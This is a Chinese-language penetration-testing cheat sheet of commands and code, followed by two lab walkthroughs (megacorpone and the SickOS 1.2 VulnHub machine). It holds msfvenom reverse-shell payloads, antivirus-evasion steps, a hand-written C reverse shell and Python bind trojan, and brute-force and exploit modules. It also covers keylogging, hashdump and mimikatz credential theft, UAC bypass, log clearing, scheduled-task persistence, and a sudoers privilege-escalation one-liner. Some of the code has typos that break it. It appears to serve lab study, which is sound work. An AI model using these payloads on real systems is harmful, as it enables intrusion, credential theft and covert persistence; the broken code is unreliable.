|-l                                                             |列出指定模块的所有可用资源,模块类型包括:payloads,encoders,nops,all
|-n                                                             |为payload预先指定一个NOP滑动长度
|-f                                                             |指定输出格式
|–help-formats                                                  |查看msf支持的输出格式列表
|-e                                                             |指定需要使用的encoder(编码器)
|-a                                                             |指定payload的目标架构
|--platform                                                     |指定payload的目标平台
|-s                                                             |设定有效攻击荷载的最大长度
|-b                                                             |设定规避字符集
|-i                                                             |指定payload的编码次数
|-c                                                             |指定一个附加的win32 shellcode文件
|-x                                                             |指定一个自定义的可执行文件作为模板
|-k                                                             |保护模板程序的动作,注入的payload作为一个新的进程运行
|–payload-options                                               |列举payload的标准选项
|-o                                                             |保存payload
|-v                                                             |指定一个自定义的变量,以确定输出格式
|–shellest                                                      |最小化生成payload
|-h                                                             |查看帮助选项


### binaries

#### linux

msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f elf > shell.elf

#### windows

msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f exe > shell.exe

#### mac

msfvenom -p osx/x86/shell_reverse_tcp lhost=your-ip  lport=your-port -f macho > shell.macho

#### android

msfvenom -p android/meterpreter/shell_reverse_tcp lhost=your-ip  lport=your-port -f apk > shell.apk


### web payloads

#### php

msfvenom -p php/meterpreter_reverse_tcp lhost=your-ip lport=your-port -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

#### asp

msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f asp > shell.asp

#### jsp

msfvenom -p java/jsp_shell_reverse_tcp lhost=your-ip lport=your-port -f raw > shell.jsp

#### war

msfvenom -p java/jsp_shell_reverse_tcp lhost=your-ip lport=your-port -f war > shell.war

#### javascript

msfvenom -p windows/shell_reverse_tcp lhost=your-ip lport=your-port -f js_le -e generic/none

msfvenom -p linux/x86/shell_reverse_tcp lhost=your-ip lport=your-port CMD=/bin/bash -f js_le -e generic/none


### scripting payloads

#### python

msfvenom -p cmd/unix/reverse_python lhost=your-ip lport=your-port -f raw > shell.py

#### jar

msfvenom -p java/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f raw -o shell.jar

#### bash

msfvenom -p cmd/unix/reverse_bash lhost=your-ip lport=your-port -f raw > shell.sh

#### perl

msfvenom -p cmd/unix/reverse_perl lhost=your-ip lport=your-port -f raw > shell.pl

#### vbscript

msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port exitfunc=thread -f vbs -a x86 --platform windows > shell.vbs
C:\Documents and Settings\Administrator>cscript shell.vbs


### shellcode

linux based shellcode:
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f <language>

windows based shellcode:
msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f <language>

mac based shellcode:
msfvenom -p osx/x86/shell_reverse_tcp lhost=your-ip lport=your-port -f <language>


## 连接

msfconsole
use exploit/multi/handler
set payload payload-name
set lhost 192.168.1.1
set lport 11111
set EnableStageEncoding false
set ExitOnSession false
exploit -j -z



# 免杀

## 病毒检测网站

https://www.virustotal.com
http://www.virscan.org/language/zh-cn/


## shellter

kali下安装:
apt-get update
apt-get install shellter

windows下安装:
https://www.shellterproject.com/download/

在命令行中使用即可


## msfencode

msfvenom windows/shell_reverse_tcp lhost=your-ip lport=your-port R -e x86/shikata_ga_nai -t exe -c -9 -x /usr/share/windows-binaries/plink.exe(载体) -o ./shell.exe


## hyperion

下载:   https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/release
```
unzip hyperion.zip
cd hyperion/
i586-mingw32msvc-g++ Src/Crypter/*.cpp -o hyperion.exe
wine hyperion.exe shell.exe(之前用msf生成的文件) crypted.exe(混淆之后的文件)
```


## 自己编写

### c

```reverse.c
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32")

	WSADATA wsaData;
	SOCKET Winsock;
	SOOKET Sock;
	struct sockaddr_in hax;
	char ip_addr[16];
	STARTUPINFO ini_processo;
	PROCESS_INFORMATION processo_info;

int main(int argc,char *argv[])
{
	WSAStartup(MAKEWORD(2,2),&wsaData);
	winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

	if (argc != 3){fprintf(stderr,"Uso: <rhost> <rport>\n";) exit(1);}
	struct hostent *host;
	host = gethostbyname(argv[1]);
	strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host->h_addr)));

	hax.sin_family = AF_INET;
	hax.sin_port = htons(atoi(argv[2]));
  	hax.sin_addr.s_addr = inet_addr(ip_addr);

  	WSAConnect(Winsock,(SOCKADDR* )&hax,sizeof(hax),NULL,NULL,NULL,NULL);

  	memset(&ini_processo,0,sizeof(ini_processo));
  	ini_processo.cb = sizeof(ini_processo);
  	ini_processo.dwFlags = START_USESTDHANDLES;
  	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
  	CreateProcess(NULL,"cmd exe",NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&process_info);
}
```
i586-mingw32msvc-gcc reverse.c -o reverse.exe -lws2_32

### python2

```bind-trojan.py
#!/usr/bin/env python

import socket
import subprocess

host = '0.0.0.0'
port = 4444

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(5)
while 1:
        client,address = s.accept()
        client.sed("[+] Welcome Master\r\n\r\n>")
        data = client.recv(1024)
        if data:
                proc = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                data = proc.stdout.read() + proc.stderr.read()
                client.send(data)
        client.close()
```
python pyinstaller.py --onefile bind-trojan.py
生成的文件会在pyinstaller/bind-trojan/dist 目录下



# metasploit

## 配置连接postgre数据库

```bash
/etc/init.d/postgresql start
su - postgres
createuser msf(用户名) -P                   输入密码(pass)
createdb --owner=msf    msf5(数据库名称)
exit
msfconsole
db_connect msf:pass@127.0.0.1/msf5
db_status                                   查看数据库连接状态
/etc/init.d/metasploit start
msfconsole
```


## 使用数据库

db_nmap 192.168.31.200-254 --top-ports 20
services -p 443


## 命令使用

setg threads 50                             设置全局线程数
sessions -l                                 列出所有会话
sessions -i 1                               切换到会话1


## auxiliary

show auxiliary
search scanner
search portscan                             扫描端口

### IPID序列扫描器

use auxiliary/scanner/ip/ipidseq
show options
set rhosts 192.168.1.0/24
set rport 8080
set threads 50
run

### snmp_enum

use auxiliary/scanner/snmp/snmp_enum
show options
set rhosts 192.168.1.1
set threads 50
run

### smb_version

use auxiliary/scanner/smb/smb_version
show options
set rhosts 192.168.1.1
set threads 50
run

### mssql

use auxiliary/scanner/mssql/mssql_ping
show options
set rhosts 192.168.1.0/24
set threads 50
run

### 搜索网站中e-mail地址

use auxiliary/gather/search_email_collector
set DOMAIN xxx.com
run

### 嗅探抓包

use auxiliary/sniffer/psnuffle
run

### webdav

use auxiliary/scanner/http/webdav_scanner
show options
set rhosts 192.168.1.1
set threads 50
run

### ssh口令枚举

use auxiliary/scanner/ssh/ssh_login
show options
set rhost 192.168.1.1
set username root
set pass_file /root/pass.txt
set threads 50
run

### mysql口令枚举

search mysql
use auxiliary/scanner/mysql/mysql_login
show options
set rhost 192.168.1.1
set username root
set pass_file /root/pass.txt
set threads 50
run

### tomcat口令枚举

search tomcat
use auauxiliary/scanner/http/tomcat_mgr_login
set rhosts 192.168.1.1
set pass_file /root/pass.txt
set user_file /root/user.txt
exploit


## exploit

### 常见漏洞

ms10_002
ms10_018
ms12_020
ms10_046
ms08_067
ms12_004
linux samba漏洞利用
dll注入攻击

### ms10_002

search ms10_002
use exploit/windows/browser/ms10_002_aurora
show options
set srvhost 192.168.1.1
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.1
set lport 11111
exploit

### ms08_067

search ms08_067
use exploit/windows/smb/ms08_067_netapi
show options
set rhost 192.168.1.2
show targets
set target 34
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.1
set lport 11111
exploit

### slmail

search pop3
use exploit/windows/pop3/seattlelab_pass
set payload windows/shell_reverse_tcp
show options
set rhost 192.168.30.35
set lhost 192.168.30.5
set lport 443
exploit

### 注意事项

如果meterpreter session 创建成功了,但很快就断连,此时应该修改使用的payload,优先改成 generic/shell_reverse_tcp 等
如果还不成功,切换回连端口或者改成bind shell 试试


## 编写自己的ruby脚本

看视频,以后再说


## meterpreter

文章:   https://www.cnblogs.com/backlion/p/9484949.html     https://xz.aliyun.com/t/2536        https://www.jianshu.com/p/f3f72f313326

截屏:
screenshot

查看当前用户:
getuid

显示当前能获得的所有权限:
getprivs

获取系统运行的平台:
sysinfo

查找文件:
search -f *pass*.txt

获取键盘记录:
keyscan_start
keyscan_dump

上传与下载文件:
upload /usr/share/windows-binaries/nc.exe c:\\Windows\\system32
download c:\\Windows\\system32\\calc.exe /tmp/calc.exe

切换到交互式系统shell:
shell

获取密码(SAM)文件中的哈希值:
hashdump

操作文件的修改,访问和创建属性:
timestomp

查看进程:
ps

切换进程(跳到所有者是系统的进程时,权限最高):
migrate 1774(pid号)

记录键盘输入:
run post/windows/capture/keylog_recorder

端口转发:
portfwd add -l 11111 -p 3389 -r 192.168.1.2     把目标主机的3389端口转发到11111端口
rdesktop -u username -p password 192.168.1.2

查看目标所在ip端:
run get_local_subnets

添加路由:
run autoroute -s 192.168.205.1/24

查看路由:
run autoroute -p

删除网段:
run autoroute -d -s 172.2.175.0

探测该网段下的存活主机:
run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24

执行程序:
execute -f notepad.exe                                      在目标主机上打开记事本
execute -H -f notepad.exe                                   在后台隐藏运行记事本
execute -H -i -f cmd.exe                                    以交互隐藏的方式运行cmd
execute  -H -m -d notepad.exe -f wce.exe -a "-o wce.txt"    -d在目标主机执行时显示的进程名称(用以伪装);-m直接从内存中执行;"-o wce.txt"是wce.exe的运行参数

显示目标机器截止到当前无操作命令的时间:
idletime

获取目标主机存储器信息:
background
use post/windows/gather/forensics/enum_drives
set session 1
exploit

windows系统UAC绕过(没有权限执行hashdump时使用):
use exploit/windows/local/bypassuac
show options
set session 1
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.30.5
set lport 8888
run

清除日志:
clearev



# 综合渗透示例

## admin.megacorpone.com

端口扫描发现81端口,访问发现是个空白的web界面

使用dirbuster爆破 http://admin.megacorpone.com:81 ,发现有admin目录且需要认证

生成字典:
cewl www.megacorpone.com -m 6 -w /root/mega-cewl.txt 2> /dev/null

以上个字典为基础生成有规律的社工性质字典:
john --wordlist=mega-cewl.txt --rules --stdout > mega-mangled

爆破后台:
medusa -h admin.megacorpone.com -u admin -p mega-mangled -M http -n 81 -m DIR:/admin -T 30

成功登录后,发现是个sqlite的管理后台,查找到管理员,获取对应的hash,保存成hashes.txt

使用hash-identifier尝试破解,但没有成功

本地搭建一个phpsqlitecms,找hash加密的函数
git clone https://github.com/ilosuna/phpsqlitecms.git
cd phpsqlitecms
grep -rl hash *
nano cms/includes/functions.admin.inc.php

找到 function generate_pw_hash($pw)

使用oclhashcat爆破:
./oclHashcat.bin -m 110 hashes.txt big-wordlist.txt --force

成功破解出其中两个hash

在后台找到sqlitemanager的版本,去exdb查找是否有对应的exp

成功找到对应的exp,并修改利用:
python sqlite-rce-fixed.py http://admin.megacorpone.com:81/admin/sqlite/ 208.68.234.99(kali-ip) 443 admin xxxxxx
nc -nvlp 443

成功获得一个www-root权限的shell,查看内核版本:
uname -a

发现存在内核溢出漏洞,查找对应的exp:
cd /tmp
wget -o gimmeroot.c http://www.exploit-db/download/18411
gcc gimmeroot.c -o gimmeroot
./gimmeroot

成功提权为root
python -c 'import pty;pty.spawn("/bin/bash")'

查找这台机器上的文件,以获取更多信息,在web的根目录中的.htaccess文件中,发现了内网ip段
查看apache的日志文件,发现其承载了一些java小程序

使用上面编写的java小程序,替换主页中的部分内容,以及evil.exe
使用msf开启侦听,一旦该用户访问我们替换过的页面,我们就会获得一个回弹shell

ipconfig查看回连过来的ip,发现是10.7.0.22
使用msf中的模块收集域信息:
use post/windows/gather/enum_domain
set session 1
run

找到域控的名称和ip: dc01 (10.7.0.21)
下载groups.xml,并查看,得到一个hash:
net use z:\\dc01\SYSVOL
z:
dir /s groups.xml
copy z:\groups.xml c:\users\downloads
cd c:\users\downloads
type groups.xml

使用gpp-decrypt破解这个hash,成功得到管理员密码(10.7.0.22)
添加路由:
route add 10.7.0.0 255.255.255.0 1

端口转发:
portfwd add -l 445 -p 445 -r 10.7.0.22

以管理员身份登录:
winexe -U Administrator%password //127.0.0.1 "cmd"

权限维持:
schtasks /create /ru SYSTEM /sc MINUTE /MO 10 /tn megapwn /tr "\"C:\\users\\downloads\\evil.exe""

关闭端口转发:
portfwd delete -l 445 -p 445 -r 10.7.0.22

重新侦听以获得系统级权限的meterpreter回连shell

获得图形化界面
远程桌面端口转发:
portfwd add -l 3389 -p 3389 -r 10.7.0.22

使用之前得到的密码远程登录:
rdesktop 127.0.0.1 -u mike -p 'mike!' -d megacorpone -g 1024*680

成功连接上后,发现IE主页是个citrix xenapp的登录页面,使用mike的账号登录
登录后,发现只有一个IE可供使用

尝试脱出IE的限制
点击设置里的 interner exploree help,在搜索框里输入notepad,转到open notepad-click to open notepad,成功打开notepad
在notepad里输入powershell,另存为cmd.bat
然后文件-打开-找到cmd.bat-右击打开,成功打开一个powershell窗口

ipconfig获得ip(10.7.0.20)
下载我们之前传到mike电脑上的evil.exe

kali机起msf侦听
.\evil.exe执行,成功获得一个普通权限的shell

尝试提权,发现KB2709715未安装:
wmic qfe |find "KB2709715"

找ms12-020的exp,上传到目标机器
upload /root/sysret.exe c:\\users\\mike\\downloads
upload /root.MinHook.x64.dll c:\\users\mike\\downloads

让meterpreter获得系统级权限:
getpid(1784)
execute -H -f sysret.exe -a "-pid 1784"
getuid

从内存中dump hash:
由于此时meterpreter是附在64位程序上的,而mimikatz是32位的,所有我们要切换进程到32位程序上,例:winlogon
ps -S winlogon
migrate 832(pid)
load mimikatz
msv
kerberos

获得所有域成员的密码,包括管理员的密码

切换到会话1:
sessions -i 1

端口转发:
portfwd add -l 3389 -p 3389 -r 10.7.0.21

远程登录,获得域控:
rdesktop 127.0.0.1 -u Administrator -p ubxxxxxx -d megacorpone


## sickos 1.2

靶机下载地址:   https://www.vulnhub.com/entry/sickos-12,144/

端口扫描,发现有80端口,访问,是张图片

dirbuster扫描目录, nikto -h ,均未发现有效信息

测试选项时,发现可以put move:
curl -v -X OPTIONS http://your-ip/test

put php文件上去:
nmap -p 80 your-ip --script http-put --script-args http-put.url='/test/exploit.php',http.put.file='exploit.php'
若成功,会返回文件创建成功

nc 侦听回连端口:
nc -nvlp 443
成功获得一个低权限shell

尝试tty escape失败

uname -a 查看内核版本也不能溢出

查看cron.d脚本:
ls -l /etc/cron.daily
发现有chkrootkit

确定chkrootkit的版本:
dpkg -l | grep chkrootkit
发现是0.49版本

查找相关的exp:
searchsploit chkrootkit
找到一个对应的exp:  /usr/share/exploitdb/exploits/linux/local/33899.txt

在目标机执行命令:
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
chmod 777 /tmp/update
run-parts /etc/cron.daily(输入任意密码)
sudo su
此时执行whoami,已变更身份为root


